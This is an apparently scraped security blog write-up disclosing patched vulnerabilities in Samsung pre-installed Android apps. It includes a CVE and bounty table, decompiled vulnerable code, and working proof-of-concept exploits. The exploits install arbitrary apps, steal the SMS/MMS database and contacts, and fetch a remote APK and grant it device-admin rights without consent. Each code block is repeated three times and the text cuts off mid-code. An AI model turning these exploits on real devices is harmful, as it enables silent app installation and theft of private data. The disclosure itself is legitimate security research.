---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-06-10_two-weeks-of-securing-samsung-devices-part-1.md
original_filename: 2021-06-10_two-weeks-of-securing-samsung-devices-part-1.md
title: 'Two weeks of securing Samsung devices: Part 1'
category: documents
detected_topics:
- mobile-security
- supply-chain
- access-control
- command-injection
- path-traversal
- automation-abuse
tags:
- imported
- documents
- mobile-security
- supply-chain
- access-control
- command-injection
- path-traversal
- automation-abuse
language: en
raw_sha256: 8b349c4e8280b85379d93c25725edfd8ebb69c9b93c4751e26cc7eb7109eaa39
text_sha256: 68829051db0d063ae961327789c3eb33541b504ebe435daa0f239a4248d2a630
ingested_at: '2026-06-28T07:32:06Z'
sensitivity: unknown
redactions_applied: false
---

# Two weeks of securing Samsung devices: Part 1

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-06-10_two-weeks-of-securing-samsung-devices-part-1.md
- Source Type: markdown
- Detected Topics: mobile-security, supply-chain, access-control, command-injection, path-traversal, automation-abuse
- Ingested At: 2026-06-28T07:32:06Z
- Redactions Applied: False
- Raw SHA256: `8b349c4e8280b85379d93c25725edfd8ebb69c9b93c4751e26cc7eb7109eaa39`
- Text SHA256: `68829051db0d063ae961327789c3eb33541b504ebe435daa0f239a4248d2a630`


## Content

---
title: "Two weeks of securing Samsung devices: Part 1"
page_title: "Two weeks of securing Samsung devices: Part 1 | Oversecured Blog"
url: "https://blog.oversecured.com/Two-weeks-of-securing-Samsung-devices-Part-1/"
final_url: "https://oversecured.com/blog/two-weeks-of-securing-samsung-devices-part-1"
authors: ["Oversecured (@OversecuredInc)"]
programs: ["Samsung"]
bugs: ["Arbitrary file write", "Insecure intent", "Android"]
bounty: "20,690"
publication_date: "2021-06-10"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3587
---

Dast is live! 

Run a new scan to see dynamic findings in your reports

[Learn more →](../dast)

Dast is live! 

[Learn more →](../dast)

Dast is live! 

Run a new scan to see dynamic findings in your reports

[Learn more →](../dast)

[](../)

[BLOG](../blog)

[Case studies](https://oversecured.com/blog?category=case-study)

[Partner](../partner)

[Wall of fame](../cve)

solutions

[Sign in](https://app.oversecured.com/sign-in)

Contact us

[](../)

[](../)

No headings found on page

May 10, 2021

Case Study

###### Two weeks of securing Samsung devices: Part 1

###### Two weeks of securing Samsung devices: Part 1

![](https://framerusercontent.com/images/ZSpxaCvChSVeJRm6v23vcTiI.png?width=2046&height=1194)

After spending two weeks looking for security bugs in the pre-installed apps on Samsung devices, we were able to find multiple dangerous vulnerabilities. In this blog, we will be going over them.

The impact of these bugs could have allowed an attacker to access and edit the victim’s contacts, calls, SMS/MMS, install arbitrary apps with device administrator rights, or read and write arbitrary files on behalf of a system user which could change the device’s settings.

These vulnerabilities could have led to a GDPR violation, and we are delighted that we could help Samsung identify and fix these vulnerabilities in a timely manner.

Vulnerability table:

CVE| SVE| AFFECTED APP| DESCRIPTION| REWARD AMOUNT  
---|---|---|---|---  
CVE-2021-25388| SVE-2021-20636| Knox Core  
(com.samsung.android  
.knox.containercore)| Installation of arbitrary apps and device-wide theft of arbitrary files| $1720  
CVE-2021-25356| SVE-2021-20733| Managed Provisioning  
(com.android  
.managedprovisioning)| Installing third-party apps and granting them Device Admin permissions| $7000  
CVE-2021-25391| SVE-2021-20500| Secure Folder  
(com.samsung  
.knox.securefolder)| Gaining access to arbitrary* content providers| $1050  
CVE-2021-25393| SVE-2021-20731| SecSettings (com.android.settings)| Gaining access to arbitrary* content providers leads to read/write access to arbitrary files as system user (UID 1000)| $5460  
CVE-2021-25392| SVE-2021-20690| Samsung DeX System UI  
(com.samsung  
.desktopsystemui)| Ability to steal notification policy configuration| $330  
CVE-2021-25397| SVE-2021-20716| TelephonyUI  
(com.samsung.android  
.app.telephonyui)| (Over-)writing arbitrary files as UID 1001| $4850  
CVE-2021-25390| SVE-2021-20724| PhotoTable  
(com.android  
.dreams.phototable)| Intent redirection leads to gaining access to arbitrary content providers| $280  
  
Do you want to check your mobile apps for such types of vulnerabilities? Oversecured mobile apps scanner provides an automatic solution that helps to detect vulnerabilities in Android and iOS mobile apps. You can integrate Oversecured into your development process and check every new line of your code to ensure your users are always protected.

Start securing your apps by starting a free 2-week trial from [Quick Start](https://app.oversecured.com/docs/quick-start/), or you can [book a call](https://calendly.com/oversecured/30min) with our team or [contact us](https://app.oversecured.com/contact-us) to explore more.

## The vulnerability in Knox Core

First, we scanned the Knox Core app and discovered that an app was installed from the SD card:

![](https://framerusercontent.com/images/8yrc016OqQKi4MWvhO5nuyUJYYw.png?width=2256&height=3674)

It also turned out that this functionality is activated via the exported service `com.samsung.android.knox.containercore.provisioning.DualDARInitService`:
  
  
  <service android:name="com.samsung.android.knox.containercore.provisioning.DualDARInitService" android:exported="true">
  <intent-filter>
  <action android:name="com.samsung.android.knox.containercore.provisioning.DualDARInitService" />
  </intent-filter>
  </service>
  
  
  <service android:name="com.samsung.android.knox.containercore.provisioning.DualDARInitService" android:exported="true">
  <intent-filter>
  <action android:name="com.samsung.android.knox.containercore.provisioning.DualDARInitService" />
  </intent-filter>
  </service>
  
  
  <service android:name="com.samsung.android.knox.containercore.provisioning.DualDARInitService" android:exported="true">
  <intent-filter>
  <action android:name="com.samsung.android.knox.containercore.provisioning.DualDARInitService" />
  </intent-filter>
  </service>

An attacker could pass an arbitrary URI via the `dualdar-config-client-location` parameter, which will be copied to `/sdcard/Android/data/com.samsung.android.knox.containercore/files/client_downloaded_knox_app.apk`, which is a world-readable location.

After that, the app installation process will be launched:
  
  
  private void proceedPrerequisiteForDualDARWithWPCOD(Intent intent) {
  if (intent.getBooleanExtra("DUAL_DAR_IS_WPCOD", false)) {
  int intExtra = intent.getIntExtra("android.intent.extra.user_handle", UserHandle.myUserId());
  Bundle bundleExtra = intent.getBundleExtra("DUAL_DAR_PARAMS");
  String string = bundleExtra.getString("dualdar-config-client-package", null);
  if (!TextUtils.isEmpty(string)) {
  DDLog.m4d("KNOXCORE::DualDARInitService", "Start proceedPrerequisiteForDualDARWithWPCOD 3rd-party crypto");
  String string2 = bundleExtra.getString("dualdar-config-client-location"); // attacker-controlled URI
  DDLog.m4d("KNOXCORE::DualDARInitService", "DualDARPolicy.KEY_CONFIG_CLIENT_LOCATION = " + string2);
  if (TextUtils.isEmpty(string2)) {
  notifyMPError(5);
  } else if (string2.startsWith("file://")) {
  String str = getExternalFilesDir(null) + "/client_downloaded_knox_app.apk";
  try {
  // attacker-controlled file is copied to the public location
  ((SemRemoteContentManager) this.mContext.getSystemService("rcp")).copyFile(intExtra, string2.replaceFirst("^file://", ""), intExtra, str);
  installPackageTask(intent, string, str); // and then installed
  } catch (RemoteException unused) {
  DDLog.m3e("KNOXCORE::DualDARInitService", "copyFile failed.");
  notifyMPError(5);
  }
  } else if (string2.startsWith("https://")) {
  downloadPackageTask(intent, string, string2);
  } else {
  notifyMPError(5);
  }
  } else {
  DDLog.m4d("KNOXCORE::DualDARInitService", "Start proceedPrerequisiteForDualDARWithWPCOD native crypto");
  startRunnerTask(intent);
  }
  }
  }
  
  
  private void proceedPrerequisiteForDualDARWithWPCOD(Intent intent) {
  if (intent.getBooleanExtra("DUAL_DAR_IS_WPCOD", false)) {
  int intExtra = intent.getIntExtra("android.intent.extra.user_handle", UserHandle.myUserId());
  Bundle bundleExtra = intent.getBundleExtra("DUAL_DAR_PARAMS");
  String string = bundleExtra.getString("dualdar-config-client-package", null);
  if (!TextUtils.isEmpty(string)) {
  DDLog.m4d("KNOXCORE::DualDARInitService", "Start proceedPrerequisiteForDualDARWithWPCOD 3rd-party crypto");
  String string2 = bundleExtra.getString("dualdar-config-client-location"); // attacker-controlled URI
  DDLog.m4d("KNOXCORE::DualDARInitService", "DualDARPolicy.KEY_CONFIG_CLIENT_LOCATION = " + string2);
  if (TextUtils.isEmpty(string2)) {
  notifyMPError(5);
  } else if (string2.startsWith("file://")) {
  String str = getExternalFilesDir(null) + "/client_downloaded_knox_app.apk";
  try {
  // attacker-controlled file is copied to the public location
  ((SemRemoteContentManager) this.mContext.getSystemService("rcp")).copyFile(intExtra, string2.replaceFirst("^file://", ""), intExtra, str);
  installPackageTask(intent, string, str); // and then installed
  } catch (RemoteException unused) {
  DDLog.m3e("KNOXCORE::DualDARInitService", "copyFile failed.");
  notifyMPError(5);
  }
  } else if (string2.startsWith("https://")) {
  downloadPackageTask(intent, string, string2);
  } else {
  notifyMPError(5);
  }
  } else {
  DDLog.m4d("KNOXCORE::DualDARInitService", "Start proceedPrerequisiteForDualDARWithWPCOD native crypto");
  startRunnerTask(intent);
  }
  }
  }
  
  
  private void proceedPrerequisiteForDualDARWithWPCOD(Intent intent) {
  if (intent.getBooleanExtra("DUAL_DAR_IS_WPCOD", false)) {
  int intExtra = intent.getIntExtra("android.intent.extra.user_handle", UserHandle.myUserId());
  Bundle bundleExtra = intent.getBundleExtra("DUAL_DAR_PARAMS");
  String string = bundleExtra.getString("dualdar-config-client-package", null);
  if (!TextUtils.isEmpty(string)) {
  DDLog.m4d("KNOXCORE::DualDARInitService", "Start proceedPrerequisiteForDualDARWithWPCOD 3rd-party crypto");
  String string2 = bundleExtra.getString("dualdar-config-client-location"); // attacker-controlled URI
  DDLog.m4d("KNOXCORE::DualDARInitService", "DualDARPolicy.KEY_CONFIG_CLIENT_LOCATION = " + string2);
  if (TextUtils.isEmpty(string2)) {
  notifyMPError(5);
  } else if (string2.startsWith("file://")) {
  String str = getExternalFilesDir(null) + "/client_downloaded_knox_app.apk";
  try {
  // attacker-controlled file is copied to the public location
  ((SemRemoteContentManager) this.mContext.getSystemService("rcp")).copyFile(intExtra, string2.replaceFirst("^file://", ""), intExtra, str);
  installPackageTask(intent, string, str); // and then installed
  } catch (RemoteException unused) {
  DDLog.m3e("KNOXCORE::DualDARInitService", "copyFile failed.");
  notifyMPError(5);
  }
  } else if (string2.startsWith("https://")) {
  downloadPackageTask(intent, string, string2);
  } else {
  notifyMPError(5);
  }
  } else {
  DDLog.m4d("KNOXCORE::DualDARInitService", "Start proceedPrerequisiteForDualDARWithWPCOD native crypto");
  startRunnerTask(intent);
  }
  }
  }

### Proof of Concept for installing arbitrary apps
  
  
  protected void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  
  Bundle bundle = new Bundle();
  bundle.putString("dualdar-config-client-package", "test.exampleapp");
  bundle.putString("dualdar-config-client-location", Uri.fromFile(copyFile()).toString());
  
  Intent i = new Intent("com.samsung.android.knox.containercore.provisioning.DualDARInitService");
  i.setClassName("com.samsung.android.knox.containercore", "com.samsung.android.knox.containercore.provisioning.DualDARInitService");
  i.putExtra("DualDARServiceEventFlag", 500);
  i.putExtra("DUAL_DAR_IS_WPCOD", true);
  i.putExtra("DUAL_DAR_PARAMS", bundle);
  startService(i);
  }
  
  private File copyFile() {
  File file = new File(getApplicationInfo().dataDir, "app.apk");
  try (InputStream inputStream = getAssets().open("app-release.apk")) {
  try (OutputStream outputStream = new FileOutputStream(file)) {
  IOUtils.copy(inputStream, outputStream);
  }
  } catch (Throwable th) {
  throw new RuntimeException(th);
  }
  return file;
  }
  
  
  protected void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  
  Bundle bundle = new Bundle();
  bundle.putString("dualdar-config-client-package", "test.exampleapp");
  bundle.putString("dualdar-config-client-location", Uri.fromFile(copyFile()).toString());
  
  Intent i = new Intent("com.samsung.android.knox.containercore.provisioning.DualDARInitService");
  i.setClassName("com.samsung.android.knox.containercore", "com.samsung.android.knox.containercore.provisioning.DualDARInitService");
  i.putExtra("DualDARServiceEventFlag", 500);
  i.putExtra("DUAL_DAR_IS_WPCOD", true);
  i.putExtra("DUAL_DAR_PARAMS", bundle);
  startService(i);
  }
  
  private File copyFile() {
  File file = new File(getApplicationInfo().dataDir, "app.apk");
  try (InputStream inputStream = getAssets().open("app-release.apk")) {
  try (OutputStream outputStream = new FileOutputStream(file)) {
  IOUtils.copy(inputStream, outputStream);
  }
  } catch (Throwable th) {
  throw new RuntimeException(th);
  }
  return file;
  }
  
  
  protected void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  
  Bundle bundle = new Bundle();
  bundle.putString("dualdar-config-client-package", "test.exampleapp");
  bundle.putString("dualdar-config-client-location", Uri.fromFile(copyFile()).toString());
  
  Intent i = new Intent("com.samsung.android.knox.containercore.provisioning.DualDARInitService");
  i.setClassName("com.samsung.android.knox.containercore", "com.samsung.android.knox.containercore.provisioning.DualDARInitService");
  i.putExtra("DualDARServiceEventFlag", 500);
  i.putExtra("DUAL_DAR_IS_WPCOD", true);
  i.putExtra("DUAL_DAR_PARAMS", bundle);
  startService(i);
  }
  
  private File copyFile() {
  File file = new File(getApplicationInfo().dataDir, "app.apk");
  try (InputStream inputStream = getAssets().open("app-release.apk")) {
  try (OutputStream outputStream = new FileOutputStream(file)) {
  IOUtils.copy(inputStream, outputStream);
  }
  } catch (Throwable th) {
  throw new RuntimeException(th);
  }
  return file;
  }

### Proof of Concept of SMS/MMS file theft
  
  
  protected void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  
  startDump();
  
  try {
  File dbPath = new File(getPackageManager().getApplicationInfo("com.android.providers.telephony", 0).dataDir, "databases/mmssms.db");
  
  Bundle bundle = new Bundle();
  bundle.putString("dualdar-config-client-package", "test.exampleapp");
  bundle.putString("dualdar-config-client-location", Uri.fromFile(dbPath).toString());
  
  Intent i = new Intent("com.samsung.android.knox.containercore.provisioning.DualDARInitService");
  i.setClassName("com.samsung.android.knox.containercore", "com.samsung.android.knox.containercore.provisioning.DualDARInitService");
  i.putExtra("DualDARServiceEventFlag", 500);
  i.putExtra("DUAL_DAR_IS_WPCOD", true);
  i.putExtra("DUAL_DAR_PARAMS", bundle);
  new Thread(() -> {
  for (int j = 1; j < 1000; j++) {
  startService(i);
  try {
  Thread.sleep(500);
  } catch (Throwable th) {
  throw new RuntimeException(th);
  }
  }
  }).start();
  } catch (Throwable th) {
  throw new RuntimeException(th);
  }
  }
  
  private void startDump() {
  final String path = "/sdcard/Android/data/com.samsung.android.knox.containercore/files/client_downloaded_knox_app.apk";
  
  ContentValues values = new ContentValues();
  values.put("_data", path);
  Uri uri = getContentResolver().insert(MediaStore.Files.getContentUri("external"), values);
  
  new Thread(() -> {
  while (true) {
  try (InputStream inputStream = getContentResolver().openInputStream(uri)) {
  String data = IOUtils.toString(inputStream);
  Log.d("evil", data);
  } catch (Throwable th) {
  }
  }
  }).start();
  }
  
  
  protected void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  
  startDump();
  
  try {
  File dbPath = new File(getPackageManager().getApplicationInfo("com.android.providers.telephony", 0).dataDir, "databases/mmssms.db");
  
  Bundle bundle = new Bundle();
  bundle.putString("dualdar-config-client-package", "test.exampleapp");
  bundle.putString("dualdar-config-client-location", Uri.fromFile(dbPath).toString());
  
  Intent i = new Intent("com.samsung.android.knox.containercore.provisioning.DualDARInitService");
  i.setClassName("com.samsung.android.knox.containercore", "com.samsung.android.knox.containercore.provisioning.DualDARInitService");
  i.putExtra("DualDARServiceEventFlag", 500);
  i.putExtra("DUAL_DAR_IS_WPCOD", true);
  i.putExtra("DUAL_DAR_PARAMS", bundle);
  new Thread(() -> {
  for (int j = 1; j < 1000; j++) {
  startService(i);
  try {
  Thread.sleep(500);
  } catch (Throwable th) {
  throw new RuntimeException(th);
  }
  }
  }).start();
  } catch (Throwable th) {
  throw new RuntimeException(th);
  }
  }
  
  private void startDump() {
  final String path = "/sdcard/Android/data/com.samsung.android.knox.containercore/files/client_downloaded_knox_app.apk";
  
  ContentValues values = new ContentValues();
  values.put("_data", path);
  Uri uri = getContentResolver().insert(MediaStore.Files.getContentUri("external"), values);
  
  new Thread(() -> {
  while (true) {
  try (InputStream inputStream = getContentResolver().openInputStream(uri)) {
  String data = IOUtils.toString(inputStream);
  Log.d("evil", data);
  } catch (Throwable th) {
  }
  }
  }).start();
  }
  
  
  protected void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  
  startDump();
  
  try {
  File dbPath = new File(getPackageManager().getApplicationInfo("com.android.providers.telephony", 0).dataDir, "databases/mmssms.db");
  
  Bundle bundle = new Bundle();
  bundle.putString("dualdar-config-client-package", "test.exampleapp");
  bundle.putString("dualdar-config-client-location", Uri.fromFile(dbPath).toString());
  
  Intent i = new Intent("com.samsung.android.knox.containercore.provisioning.DualDARInitService");
  i.setClassName("com.samsung.android.knox.containercore", "com.samsung.android.knox.containercore.provisioning.DualDARInitService");
  i.putExtra("DualDARServiceEventFlag", 500);
  i.putExtra("DUAL_DAR_IS_WPCOD", true);
  i.putExtra("DUAL_DAR_PARAMS", bundle);
  new Thread(() -> {
  for (int j = 1; j < 1000; j++) {
  startService(i);
  try {
  Thread.sleep(500);
  } catch (Throwable th) {
  throw new RuntimeException(th);
  }
  }
  }).start();
  } catch (Throwable th) {
  throw new RuntimeException(th);
  }
  }
  
  private void startDump() {
  final String path = "/sdcard/Android/data/com.samsung.android.knox.containercore/files/client_downloaded_knox_app.apk";
  
  ContentValues values = new ContentValues();
  values.put("_data", path);
  Uri uri = getContentResolver().insert(MediaStore.Files.getContentUri("external"), values);
  
  new Thread(() -> {
  while (true) {
  try (InputStream inputStream = getContentResolver().openInputStream(uri)) {
  String data = IOUtils.toString(inputStream);
  Log.d("evil", data);
  } catch (Throwable th) {
  }
  }
  }).start();
  }

The PoC works as follows:

  1. A service is launched to copy the required file to a public location (since this is an invalid APK file, it will be deleted immediately after an installation error),

  2. Then, the `client_downloaded_knox_app.apk` file is read.

**Note:** We use `MediaStore.Files` because the latest Android versions do not allow direct reading from external storages belonging to other apps, but this can be bypassed using the Android Media Content Provider.

## The vulnerability in Managed Provisioning

Managed Provisioning is a pre-installed app on all Samsung devices and is used for corporate device customization.

Once again, while testing Managed Provisioning, we found a vulnerability on installing an app from a public directory:

![](https://framerusercontent.com/images/yp9mhN1dwX7zHNlJ5JrR9PRxypI.png?width=4624&height=1426)

The original app was developed by AOSP and it had security checks to verify the authorization of any interactions. The Managed Provisioning app was modified by Samsung to add features which were needed to interact with their ecosystem and Knox Core.

Therefore, in the Samsung app, this check could be bypassed by setting the value `com.samsung.knox.container.requestId`:
  
  
  int intExtra = intent.getIntExtra("com.samsung.knox.container.requestId", -1);
  if (intExtra > 0) {
  ProvisionLogger.logw("Skipping verifyActionAndCaller"); // the bypass
  } else if (!verifyActionAndCaller(intent, str)) {
  return;
  }
  
  
  int intExtra = intent.getIntExtra("com.samsung.knox.container.requestId", -1);
  if (intExtra > 0) {
  ProvisionLogger.logw("Skipping verifyActionAndCaller"); // the bypass
  } else if (!verifyActionAndCaller(intent, str)) {
  return;
  }
  
  
  int intExtra = intent.getIntExtra("com.samsung.knox.container.requestId", -1);
  if (intExtra > 0) {
  ProvisionLogger.logw("Skipping verifyActionAndCaller"); // the bypass
  } else if (!verifyActionAndCaller(intent, str)) {
  return;
  }

### Proof of Concept for installing custom apps and giving them Device Admin rights

This Proof of Concept was built by copying the code of the `ProvisioningParams.Builder` class and passing the standard parameters needed to configure Managed Provisioning, which included:

  * the URL for downloading the app

  * the SHA1 hash of the file

  * the [Device Admin receiver](https://developer.android.com/guide/topics/admin/device-admin#developing) component name

  
  
  byte[] hash = Base64.decode("5VNuCGDQygiVg4S86BKhySBVJlOpDZs3YYYsJKIOtCQ", 0);
  PackageDownloadInfo.Builder infoBuiler = PackageDownloadInfo.Builder.builder()
  .setLocation("https://redacted.s3.amazonaws.com/app-release.apk")
  .setPackageChecksum(hash)
  .setSignatureChecksum(hash);
  
  ProvisioningParams.Builder builder = ProvisioningParams.Builder.builder()
  .setSkipUserConsent(true)
  .setDeviceAdminComponentName(new ComponentName("test.exampleapp", "test.exampleapp.MyReceiver"))
  .setDeviceAdminPackageName("test.exampleapp")
  .setProvisioningAction("android.app.action.PROVISION_MANAGED_DEVICE")
  .setDeviceAdminDownloadInfo(infoBuiler.build());
  
  ProvisioningParams params = builder.build();
  
  Intent i = new Intent("com.android.managedprovisioning.action.RESUME_PROVISIONING");
  i.setClassName("com.android.managedprovisioning", "com.android.managedprovisioning.preprovisioning.PreProvisioningActivity");
  i.putExtra("provisioningParams", params);
  i.putExtra("com.samsung.knox.container.requestId", 1);
  i.putExtra("com.samsung.knox.container.configType", "knox-do-basic");
  startActivity(i);
  
  
  byte[] hash = Base64.decode("5VNuCGDQygiVg4S86BKhySBVJlOpDZs3YYYsJKIOtCQ", 0);
  PackageDownloadInfo.Builder infoBuiler = PackageDownloadInfo.Builder.builder()
  .setLocation("https://redacted.s3.amazonaws.com/app-release.apk")
  .setPackageChecksum(hash)
  .setSignatureChecksum(hash);
  
  ProvisioningParams.Builder builder = ProvisioningParams.Builder.builder()
  .setSkipUserConsent(true)
  .setDeviceAdminComponentName(new ComponentName("test.exampleapp", "test.exampleapp.MyReceiver"))
  .setDeviceAdminPackageName("test.exampleapp")
  .setProvisioningAction("android.app.action.PROVISION_MANAGED_DEVICE")
  .setDeviceAdminDownloadInfo(infoBuiler.build());
  
  ProvisioningParams params = builder.build();
  
  Intent i = new Intent("com.android.managedprovisioning.action.RESUME_PROVISIONING");
  i.setClassName("com.android.managedprovisioning", "com.android.managedprovisioning.preprovisioning.PreProvisioningActivity");
  i.putExtra("provisioningParams", params);
  i.putExtra("com.samsung.knox.container.requestId", 1);
  i.putExtra("com.samsung.knox.container.configType", "knox-do-basic");
  startActivity(i);
  
  
  byte[] hash = Base64.decode("5VNuCGDQygiVg4S86BKhySBVJlOpDZs3YYYsJKIOtCQ", 0);
  PackageDownloadInfo.Builder infoBuiler = PackageDownloadInfo.Builder.builder()
  .setLocation("https://redacted.s3.amazonaws.com/app-release.apk")
  .setPackageChecksum(hash)
  .setSignatureChecksum(hash);
  
  ProvisioningParams.Builder builder = ProvisioningParams.Builder.builder()
  .setSkipUserConsent(true)
  .setDeviceAdminComponentName(new ComponentName("test.exampleapp", "test.exampleapp.MyReceiver"))
  .setDeviceAdminPackageName("test.exampleapp")
  .setProvisioningAction("android.app.action.PROVISION_MANAGED_DEVICE")
  .setDeviceAdminDownloadInfo(infoBuiler.build());
  
  ProvisioningParams params = builder.build();
  
  Intent i = new Intent("com.android.managedprovisioning.action.RESUME_PROVISIONING");
  i.setClassName("com.android.managedprovisioning", "com.android.managedprovisioning.preprovisioning.PreProvisioningActivity");
  i.putExtra("provisioningParams", params);
  i.putExtra("com.samsung.knox.container.requestId", 1);
  i.putExtra("com.samsung.knox.container.configType", "knox-do-basic");
  startActivity(i);

After opening the app, this is what happened:

  1. Managed Provisioning was forced to download a malicious app from the attacker-specified link

  2. The malicious app installed in Step 1 was made a device administrator with an arbitrary set of rights

  3. A process was initiated which would remove all the other apps installed on the same device.

The attack looked like this:

## The vulnerability in Secure Folder

Secure Folder is a secure file storage app which is pre-installed on Samsung devices. It has a large set of rights that an attacker could intercept by exploiting the vulnerability found in accessing [arbitrary* content providers](https://blog.oversecured.com/Gaining-access-to-arbitrary-Content-Providers/):

![](https://framerusercontent.com/images/GEChSVyyHsKiQldiWN2BqE2dQfs.png?width=2268&height=3408)

Once an attacker receives the intent which was sent by them, they would be able to intercept the rights.

As a PoC, we intercepted the rights to read/write contacts:
  
  
  protected void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  
  Intent i = new Intent();
  i.setClassName("com.samsung.knox.securefolder", "com.samsung.knox.securefolder.containeragent.ui.settings.KnoxSettingCheckLockTypeActivity");
  i.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
  i.setData(ContactsContract.RawContacts.CONTENT_URI);
  startActivityForResult(i, 0);
  }
  
  protected void onActivityResult(int requestCode, int resultCode, Intent data) {
  super.onActivityResult(requestCode, resultCode, data);
  
  dump(data.getData());
  }
  
  private void dump(Uri uri) {
  Cursor cursor = getContentResolver().query(uri, null, null, null, null);
  if (cursor.moveToFirst()) {
  do {
  StringBuilder sb = new StringBuilder();
  for (int i = 0; i < cursor.getColumnCount(); i++) {
  if (sb.length() > 0) {
  sb.append(", ");
  }
  sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
  }
  Log.d("evil", sb.toString());
  } while (cursor.moveToNext());
  }
  }
  
  
  protected void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  
  Intent i = new Intent();
  i.setClassName("com.samsung.knox.securefolder", "com.samsung.knox.securefolder.containeragent.ui.settings.KnoxSettingCheckLockTypeActivity");
  i.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
  i.setData(ContactsContract.RawContacts.CONTENT_URI);
  startActivityForResult(i, 0);
  }
  
  protected void onActivityResult(int requestCode, int resultCode, Intent data) {
  super.onActivityResult(requestCode, resultCode, data);
  
  dump(data.getData());
  }
  
  private void dump(Uri uri) {
  Cursor cursor = getContentResolver().query(uri, null, null, null, null);
  if (cursor.moveToFirst()) {
  do {
  StringBuilder sb = new StringBuilder();
  for (int i = 0; i < cursor.getColumnCount(); i++) {
  if (sb.length() > 0) {
  sb.append(", ");
  }
  sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
  }
  Log.d("evil", sb.toString());
  } while (cursor.moveToNext());
  }
  }
  
  
  protected void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  
  Intent i = new Intent();
  i.setClassName("com.samsung.knox.securefolder", "com.samsung.knox.securefolder.containeragent.ui.settings.KnoxSettingCheckLockTypeActivity");
  i.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
  i.setData(ContactsContract.RawContacts.CONTENT_URI);
  startActivityForResult(i, 0);
  }
  
  protected void onActivityResult(int requestCode, int resultCode, Intent data) {
  super.onActivityResult(requestCode, resultCode, data);
  
  dump(data.getData());
  }
  
  private void dump(Uri uri) {
  Cursor cursor = getContentResolver().query(uri, null, null, null, null);
  if (cursor.moveToFirst()) {
  do {
  StringBuilder sb = new StringBuilder();
  for (int i = 0; i < cursor.getColumnCount(); i++) {
  if (sb.length() > 0) {
  sb.append(", ");
  }
  sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
  }
  Log.d("evil", sb.toString());
  } while (cursor.moveToNext());
  }
  }

## The vulnerability in SecSettings

SecSettings is Samsung’s pre-installed settings app.

The vulnerability on reading and writing arbitrary files from UID 1000 (`system`) consists of two components:

  * gaining access to arbitrary* content providers

  * exploiting an insecure FileProvider in the `com.sec.imsservice` app

![](https://framerusercontent.com/images/7NtYRqMFenWIkDgaKiRsY4nhh6U.png?width=2256&height=708)

This chain is only possible because both apps use the same shared UID specified in their `AndroidManifest.xml`: `android:sharedUserId="android.uid.system"`. In fact, this setting means that two different apps can share absolutely all resources and have full access to each other’s components. The vulnerability in SecSettings is Google’s. It was reported to the Android VDP. The reward is $2000. We will disclose the details of this issue in the Part 2 article.

## The vulnerability in Samsung DeX System UI

This vulnerability allowed an attacker to steal data from user notifications, which would typically include chat descriptions for Telegram, Google Docs folders, Samsung Email and Gmail inboxes, and information from notifications of other apps.

The attacker could also activate the functionality to create a backup in the world-readable directory on the SD card:

![](https://framerusercontent.com/images/ruzlMgwg9ezjQbAoRoJxko57Y.png?width=2246&height=8044)

Since the file was deleted immediately after creating a backup, we added a functionality to create a backup copy to prevent this.

### Proof of Concept:
  
  
  final File root = Environment.getExternalStorageDirectory();
  final File policyFile = new File(root, "notification_policy.xml");
  final File backupCopy = new File(root, "backup");
  
  Intent i = new Intent("com.samsung.android.intent.action.REQUEST_BACKUP_NOTIFICATION");
  i.setClassName("com.samsung.desktopsystemui", "com.samsung.desktopsystemui.NotificationBackupRestoreManager$NotificationBnRReceiver");
  i.putExtra("SAVE_PATH", root.getAbsolutePath());
  i.putExtra("SESSION_KEY", "not_empty");
  sendBroadcast(i);
  
  new Thread(() -> {
  while (true) {
  if (policyFile.exists()) {
  try (InputStream inputStream = new FileInputStream(policyFile)) {
  try (OutputStream outputStream = new FileOutputStream(backupCopy)) {
  IOUtils.copy(inputStream, outputStream);
  }
  } catch (Throwable th) {
  throw new RuntimeException(th);
  }
  }
  }
  }).start();
  
  
  final File root = Environment.getExternalStorageDirectory();
  final File policyFile = new File(root, "notification_policy.xml");
  final File backupCopy = new File(root, "backup");
  
  Intent i = new Intent("com.samsung.android.intent.action.REQUEST_BACKUP_NOTIFICATION");
  i.setClassName("com.samsung.desktopsystemui", "com.samsung.desktopsystemui.NotificationBackupRestoreManager$NotificationBnRReceiver");
  i.putExtra("SAVE_PATH", root.getAbsolutePath());
  i.putExtra("SESSION_KEY", "not_empty");
  sendBroadcast(i);
  
  new Thread(() -> {
  while (true) {
  if (policyFile.exists()) {
  try (InputStream inputStream = new FileInputStream(policyFile)) {
  try (OutputStream outputStream = new FileOutputStream(backupCopy)) {
  IOUtils.copy(inputStream, outputStream);
  }
  } catch (Throwable th) {
  throw new RuntimeException(th);
  }
  }
  }
  }).start();
  
  
  final File root = Environment.getExternalStorageDirectory();
  final File policyFile = new File(root, "notification_policy.xml");
  final File backupCopy = new File(root, "backup");
  
  Intent i = new Intent("com.samsung.android.intent.action.REQUEST_BACKUP_NOTIFICATION");
  i.setClassName("com.samsung.desktopsystemui", "com.samsung.desktopsystemui.NotificationBackupRestoreManager$NotificationBnRReceiver");
  i.putExtra("SAVE_PATH", root.getAbsolutePath());
  i.putExtra("SESSION_KEY", "not_empty");
  sendBroadcast(i);
  
  new Thread(() -> {
  while (true) {
  if (policyFile.exists()) {
  try (InputStream inputStream = new FileInputStream(policyFile)) {
  try (OutputStream outputStream = new FileOutputStream(backupCopy)) {
